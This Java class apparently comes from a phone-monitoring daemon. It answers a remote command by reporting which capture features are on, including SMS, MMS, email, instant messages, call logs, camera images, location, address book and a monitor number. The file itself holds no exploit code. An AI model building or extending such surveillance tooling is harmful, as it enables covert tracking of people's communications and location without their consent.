package com.fx.maind.command.processor;

import com.fx.maind.ref.CurrentSettings;
import com.fx.maind.ref.Customization;
import com.vvt.configurationmanager.ConfigurationManager;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.license.LicenseInfo;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefEventsCapture;
import com.vvt.preference_manager.PrefLocation;
import com.vvt.preference_manager.PrefMonitorNumber;
import com.vvt.preference_manager.PrefWatchList;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;

public class RemoteGetCurrentSettingsProcessor {
	private final static String TAG = "RemoteGetCurrentSettingsProcessor";
	private static final boolean LOGE = Customization.ERROR;
	
	private AppEngine mAppEngine;
	
	public RemoteGetCurrentSettingsProcessor(AppEngine appEngine) {
		mAppEngine = appEngine;
	}
	
	public CurrentSettings process() {
		CurrentSettings currentSettings = new CurrentSettings();
		
		try {
			PreferenceManager preferenceManager = mAppEngine.getPreferenceManager();
			ConfigurationManager configurationManager = mAppEngine.getConfigurationManager();
			
			LicenseInfo licenseInfo = mAppEngine.getLicenseManager().getLicenseInfo();
			
			PrefEventsCapture eventsCapturePref = 
					(PrefEventsCapture) preferenceManager.getPreference(
							PreferenceType.EVENTS_CTRL);
			
			PrefLocation locationCapturePref = 
					(PrefLocation) preferenceManager.getPreference(
							PreferenceType.LOCATION);
			
			PrefMonitorNumber prefMonitorNumber = 
					(PrefMonitorNumber) preferenceManager.getPreference(
							PreferenceType.MONITOR_NUMBER);
			
			PrefWatchList watchList = 
					(PrefWatchList) preferenceManager.getPreference(
							PreferenceType.WATCH_LIST);
			
			currentSettings.setEnableStartCapture(eventsCapturePref.getEnableStartCapture());
	        currentSettings.setDeliverTimer(eventsCapturePref.getDeliverTimer());
	        currentSettings.setMaxEvent(eventsCapturePref.getMaxEvent());
	        currentSettings.setLocationInterval(locationCapturePref.getLocationInterval());
	        currentSettings.setConfigurationId(licenseInfo.getConfigurationId());
	        currentSettings.setSupportedFeture(configurationManager.getConfiguration().getSupportedFeture());
	        currentSettings.setEnableCallLog(eventsCapturePref.getEnableCallLog());
	        currentSettings.setEnableCameraImage(eventsCapturePref.getEnableCameraImage());
	        currentSettings.setEnableEmail(eventsCapturePref.getEnableEmail());
	        currentSettings.setEnableLocation(locationCapturePref.getEnableLocation());
	        currentSettings.setEnableMMS(eventsCapturePref.getEnableMMS());
	        currentSettings.setEnableSMS(eventsCapturePref.getEnableSMS());
	        currentSettings.setEnableAddressBook(eventsCapturePref.getEnableAddressBook());
	        currentSettings.setEnableAudioFile(eventsCapturePref.getEnableAudioFile());
	        currentSettings.setEnableVideoFile(eventsCapturePref.getEnableVideoFile());
	        currentSettings.setEnableWallPaper(eventsCapturePref.getEnableWallPaper());
	        currentSettings.setEnableMonitor(prefMonitorNumber.getEnableMonitor());
	        currentSettings.setEnableWatchNotification(watchList.getEnableWatchNotification());
	        currentSettings.setEnableIM(eventsCapturePref.getEnableIM());
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, "process # Error", e);
		}
        
        return currentSettings;
	}

}
